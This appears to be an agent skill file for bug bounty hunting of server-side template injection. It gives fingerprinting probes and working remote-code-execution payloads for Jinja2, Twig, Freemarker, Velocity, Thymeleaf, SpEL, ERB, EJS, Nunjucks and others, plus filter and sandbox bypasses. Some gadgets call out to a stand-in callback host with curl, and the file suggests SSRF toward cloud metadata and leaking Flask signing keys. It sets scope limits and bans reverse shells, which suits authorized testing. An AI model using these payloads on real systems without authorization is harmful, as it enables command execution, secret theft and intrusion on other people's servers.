---
name: hunt-ssti
description: "Hunt server-side template injection (SSTI) across Jinja2 (Flask; Django only if Jinja2 is configured), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode. Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints that compose strings with user input before render."
---

# HUNT-SSTI — Server-side template injection

The server concatenates user input into a template string and **renders** it. `{{7*7}}` → `49` in a **curl** body is detection. It is not RCE. Client-side Angular/Vue also evaluate `{{7*7}}` in the browser — if curl returns the payload unchanged, it is not this bug.

## Rails
- In-scope only. One probe per sink, then one impact payload.
- No resource-burning loops inside templates (`range(10**9)`, billion-laughs strings, fork bombs).
- No reverse shell and no file drop. Proof is `id`/`whoami` in the response or a single OOB callback whose path contains that output.
- Sandboxed render (`49` but every RCE gadget throws) is SSTI, not Critical RCE. Say which.
- Stop at draft. Never auto-submit.

## Decision tree

1. **Find render sinks, not just reflected parameters.** Email subject/body, PDF/invoice, CMS preview, theme/widget, notification, error page, markdown that is re-rendered server-side, filename passed to `render()`, SMS/Slack template, SSO error text.
2. **curl the polyglot** (do not use a browser):
   ```
   {{7*7}}${7*7}<%=7*7%>#{7*7}*{7*7}{{7*'7'}}
   ```
3. **Classify from the raw response:**

   | You see | Engine family | Next probe |
   |---|---|---|
   | `49` from `{{7*7}}` and `7777777` from `{{7*'7'}}` | Jinja2 (`str * int`). Nunjucks does **not** produce `7777777` | `{{config}}` / `{{self}}` |
   | `{{7*7}}` empty or unchanged; `{% debug %}` dumps context | Django DTL — **not** Jinja2. DTL has no expression eval | Recon only, unless the project actually enabled Jinja2 (`Jinja2` / `jinja2.Environment` in a stack trace) |
   | `49` and the `*'7'` site is also `49` | Twig, Nunjucks (JS coerces `'7'*7` to 49), Blade (`{{ }}` is PHP), Pebble | `{{_self}}` / `{{app}}`, then the Nunjucks constructor gadget |
   | `${7*7}` → `49`, braces unchanged | Freemarker, Spring EL, Mako | error text names which |
   | `<%=7*7%>` → `49` | ERB or EJS | stack trace or `process` vs backtick |
   | `*{7*7}` → `49` | Thymeleaf selection (often only inside a template attribute) | `[[${7*7}]]` |
   | `{7*7}` → `49` | Smarty | `{php}` only if the error says Smarty 2 / security off |
   | Payload unchanged in curl, `49` only in a browser | Client template (AngularJS/Vue). Not SSTI | `hunt-xss` / CSTI |
   | Go `{{7*7}}` unchanged | `text/template` has no math. Try `{{printf "%s" .}}` | RCE only if a FuncMap exposes exec |
   | Engine error (`jinja2.exceptions`, `Twig\\Error`, `freemarker.core`, `org.thymeleaf`, `TemplateSyntaxError`, `velocity`) | Sink confirmed even when math was filtered | Use the syntax the error accepts |

4. **Escalate with that engine's gadget.** If the gadget throws a security/sandbox error, try the attr/filter bypass once. If that throws too, report sandboxed SSTI with the `49` evidence — do not claim RCE.
5. **Blind sinks** (email, queue, PDF you never see): one OOB payload (`curl http://UNIQUE.collab/` or a 2s sleep) and poll. n≥10 only for the timing channel.
6. **Second order:** the field that stores "template source" (signature, theme, invoice note) is the sink even when the save response is clean. Trigger preview/send.

## RCE gadgets

Use a unique host `UNIQUE.collab`. Replace `id` with `id|curl http://UNIQUE.collab/` when the render output is not returned.

**Jinja2** — context objects first; do not hardcode a `.__subclasses__()[N]` index (it moves every Python release).
```
{{lipsum.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```
Filter bypass when `.` and `_` are stripped:
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
Statement form if `{{` is encoded and `{%` is not: `{% print(lipsum.__globals__.os.popen('id').read()) %}`.

**Twig** — `_self.env.registerUndefinedFilterCallback("exec")` then `getFilter("id")` is the legacy chain (removed on current Twig). Try, then:
```
{{['id']|filter('system')}}
{{['id']|map('system')}}
{{['id']|reduce('system')}}
```
Sandbox exception → stop at SSTI, not RCE. `{{include('http://UNIQUE.collab/')}}` is SSRF evidence if it fetches.

**Freemarker**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```
`?api` on a Java object is the newer method-access path when `?new` on `Execute` is blocked. One command.

**Velocity**
```
#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime().exec("curl http://UNIQUE.collab/ssti"))
```
`exec(String)` tokenizes on spaces, so `curl` plus one URL is enough, and it returns no stdout. If `$class` is absent, the math probe may still be Freemarker — trust the exception class.

**Thymeleaf (Spring view-name injection, not a random HTML field)**
```
__${T(java.lang.Runtime).getRuntime().exec(new String[]{"curl","http://UNIQUE.collab/ssti"})}__::.x
```
Detection in an expression: `*{7*7}` or `[[${7*7}]]`. `exec("id")` returns a Process and no stdout — the callback is the proof. No callback, no RCE.

**Spring EL / SpEL** (header or query that reaches `parseExpression`, including Spring Cloud Function `spring.cloud.function.routing-expression` on old 3.1/3.2):
```
${T(java.lang.Runtime).getRuntime().exec("curl http://UNIQUE.collab/")}
```
A DNS hit proves evaluation. Claim RCE only with a callback you can tie to the command.

**Mako:** `${self.module.cache.util.os.popen("id").read()}`. **ERB:** `<%= IO.popen('id').read %>`. **EJS:** `<%= process.mainModule.require('child_process').execSync('id') %>`. If `mainModule` is null (Node 20.16+ / 22+), use `process.getBuiltinModule('child_process')` the same way. **Nunjucks:** `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}` with that same `getBuiltinModule` swap when `mainModule` is null. **Smarty (legacy `{php}` or `{system('id')}`):** only if the error banner is Smarty; Smarty 3+ security policy blocks `{php}`. **Pebble / Liquid / Handlebars:** `49` or a dump is the bug; they do not expose a portable RCE gadget — do not invent one. **Go `text/template`:** RCE only through a dangerous FuncMap (`exec`, `env`); `html/template` escaping is XSS (`hunt-xss`), not SSTI RCE.

## Bypasses
- Quote and concat: `{{'os'.__class__}}` variants, `attr('\x5f\x5fclass\x5f\x5f')`.
- `{{request.args.a}}` then pass the gadget as `?a=` so the payload is not in the stored template.
- Newlines / `{%` … `%}` when `{{` is filtered.
- Unicode escapes in JSON templates (`\u007b\u007b`).
- PDF/HTML engines that strip `{{` but pass `${}` (or the reverse) — send the polyglot so one request fingerprints this.

## Validation
- **Detection:** curl body contains `49` / `7777777` and does not contain the probe literal. Or a template-engine stack trace caused by the probe.
- **RCE:** response contains the `uid=` / `whoami` line, **or** one OOB request whose query/path includes that output (unique hostname per sink).
- **Sandbox:** `49` plus a security exception on every gadget. Severity stays below RCE. Stored XSS via the same sink is `hunt-xss` if HTML is rendered to another user.
- **Not a finding:** browser-only `49`, reflected `{{7*7}}` unchanged, math evaluated in your own markdown preview that only you can open (self-impact — say so and drop unless another user renders it).

## Chains
- **`hunt-rce`** — gadget above returned command output. That is the RCE report; do not file a second theoretical one.
- **`hunt-session` / `hunt-jwt`** — Jinja2/Flask `{{config}}` or `{{config.SECRET_KEY}}` dumps the signing key when RCE gadgets sandbox. Mint a session for an account you own; body-diff `/me`. That is ATO, not RCE.
- **`hunt-xss`** — sandboxed engine still emits unsanitized HTML into an email or a shared preview.
- **`hunt-ssrf`** — `include` / `from_file` / Freemarker `?url` fetches your host or `169.254.169.254`. IMDSv2 needs a PUT token; a GET that returns 401 is reachability, not cloud keys.
- **`hunt-file-upload`** — office/HTML/SVG upload re-rendered by a template. The payload lives in the file the parser extracts (DOCX `word/document.xml`, an HTML invoice).

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
